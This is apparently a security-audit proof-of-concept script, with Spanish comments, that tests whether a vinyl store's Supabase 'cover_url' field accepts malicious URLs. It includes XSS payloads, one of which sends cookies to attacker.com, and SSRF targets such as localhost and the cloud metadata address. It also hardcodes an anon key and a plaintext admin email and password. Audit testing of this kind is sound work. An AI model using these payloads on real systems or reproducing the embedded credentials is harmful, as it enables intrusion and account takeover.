/**
 * PoC — VUL-04: SSRF / URL Injection en campo cover_url
 * Proyecto: VynilStore (Groovehaus)
 * Auditor: Manuel
 * 
 * OBJETIVO: Verificar si el campo cover_url acepta URLs maliciosas
 * y si éstas se almacenan en la DB sin validación. Prueba payloads
 * de javascript:, data:, y URLs internas.
 * 
 * USO:
 *   node poc_vul04_url_injection.js
 * 
 * NOTA: Requiere credenciales de ADMIN para poder insertar en vinyls.
 */

import { createClient } from '@supabase/supabase-js'

const SUPABASE_URL  = 'https://ybcxzntioiohbmyhwiee.supabase.co'
const SUPABASE_ANON = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InliY3h6bnRpb2lvaGJteWh3aWVlIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzkyNDI2MTksImV4cCI6MjA5NDgxODYxOX0.slRr5A5K804uag2N-1g6u9jz2Vaq2FXB1mRoxQXE37k'

const ADMIN_EMAIL    = 'manuelpro@ucol.mx'
const ADMIN_PASSWORD = 'manuelricolino'

const supabase = createClient(SUPABASE_URL, SUPABASE_ANON)

// Payloads de prueba para cover_url
const PAYLOADS = [
  {
    name: 'javascript: URI (XSS vector)',
    url: 'javascript:alert(document.cookie)',
    expected_blocked: true,
    impact: 'XSS en navegadores que ejecuten javascript: en img.src'
  },
  {
    name: 'data: URI con HTML (XSS vector)',
    url: 'data:text/html,<script>fetch("https://attacker.com/?c="+document.cookie)</script>',
    expected_blocked: true,
    impact: 'Exfiltración de cookies si el navegador renderiza data: URIs'
  },
  {
    name: 'URL interna localhost (SSRF)',
    url: 'http://localhost:3000/secret-endpoint',
    expected_blocked: true,
    impact: 'SSRF — acceso a servicios internos no expuestos'
  },
  {
    name: 'AWS Metadata (SSRF cloud)',
    url: 'http://169.254.169.254/latest/meta-data/',
    expected_blocked: true,
    impact: 'SSRF — acceso a metadatos de instancia cloud'
  },
  {
    name: 'URL HTTP sin HTTPS',
    url: 'http://unsecured-image.com/img.png',
    expected_blocked: true,
    impact: 'Mixed content, sin TLS en transmisión de imagen'
  },
  {
    name: 'URL vacía',
    url: '',
    expected_blocked: false,
    impact: 'Menor — imagen rota en catálogo'
  }
]

async function runPoC() {
  console.log('='.repeat(60))
  console.log('PoC VUL-04 — URL Injection / SSRF en cover_url')
  console.log('='.repeat(60))

  // Login como admin
  const { data: loginData, error: loginErr } = await supabase.auth.signInWithPassword({
    email: ADMIN_EMAIL, password: ADMIN_PASSWORD
  })
  if (loginErr) { console.error('❌ Login fallido:', loginErr.message); process.exit(1) }
  console.log(`\n✅ Autenticado como admin: ${loginData.user.email}`)

  const createdIds = []

  for (const payload of PAYLOADS) {
    console.log(`\n[TEST] ${payload.name}`)
    console.log(`   URL: ${payload.url.substring(0, 80)}...`)
    
    // Intentar insertar el vinyl con la URL maliciosa
    const { data, error } = await supabase
      .from('vinyls')
      .insert([{
        title: `[AUDIT TEST] ${payload.name}`,
        artist: 'Security Audit PoC',
        price: 0,
        year: 2026,
        type: 'LP',
        availability: 'agotado',
        cover_url: payload.url,
        description: `Prueba de auditoría — ${payload.impact}`
      }])
      .select('id, cover_url')

    if (error) {
      console.log(`   ✅ Insertión RECHAZADA: ${error.message}`)
    } else if (data && data.length > 0) {
      const stored = data[0].cover_url
      const wasStored = stored === payload.url
      
      if (wasStored && payload.expected_blocked) {
        console.log(`   🔴 VULNERABLE: URL maliciosa ALMACENADA en DB`)
        console.log(`   → cover_url guardado: ${stored.substring(0, 80)}`)
        console.log(`   → IMPACTO: ${payload.impact}`)
        createdIds.push(data[0].id)
      } else {
        console.log(`   ✅ URL fue sanitizada o rechazada`)
        console.log(`   → Valor guardado: ${stored}`)
        createdIds.push(data[0].id)
      }
    }
  }

  // Cleanup: eliminar registros de prueba
  console.log('\n[CLEANUP] Eliminando registros de prueba...')
  for (const id of createdIds) {
    const { error } = await supabase.from('vinyls').delete().eq('id', id)
    if (error) console.log(`   ⚠️  No se pudo eliminar ID ${id}: ${error.message}`)
    else console.log(`   🗑️  Eliminado: ${id}`)
  }

  console.log('\n' + '='.repeat(60))
  
  // Test adicional: verificar frontend validation
  console.log('\n[VALIDACIÓN FRONTEND]')
  console.log('La validación actual en Admin.jsx es solo type="url" en HTML.')
  console.log('Verificar manualmente en el navegador:')
  console.log('  1. Abrir /admin')
  console.log('  2. Click "Nuevo Vinilo"')
  console.log('  3. En "URL Portada", ingresar: javascript:alert(1)')
  console.log('  4. ¿El formulario lo acepta? → Si sí, VUL-04 confirmada en frontend.')

  await supabase.auth.signOut()
  console.log('\nFIN DEL TEST VUL-04')
}

runPoC().catch(console.error)
